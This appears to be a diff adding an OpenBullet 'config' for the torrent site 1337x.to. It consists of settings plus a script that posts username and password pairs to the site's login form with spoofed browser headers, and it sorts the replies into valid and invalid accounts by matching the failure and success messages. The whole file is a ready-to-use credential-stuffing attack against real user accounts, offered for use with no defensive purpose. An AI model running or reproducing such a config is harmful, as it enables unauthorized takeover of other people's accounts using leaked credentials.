@@ -1,0 +1,41 @@
+[SETTINGS]
+{
+  "Name": "1337x",
+  "SuggestedBots": 1,
+  "LastModified": "2018-11-02T06:24:09.6161486+00:00",
+  "AdditionalInfo": "",
+  "Author": "maxokream",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://1337x.to/login" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&submit=Login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://1337x.to" 
+  HEADER "referer: https://1337x.to/login" 
+  HEADER "upgrade-insecure-requests: 1" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Bad Login" 
+    KEY "Bad Username" 
+    KEY "Disabled Account" 
+  KEYCHAIN Success OR 
+    KEY "You have successfully logged in" 
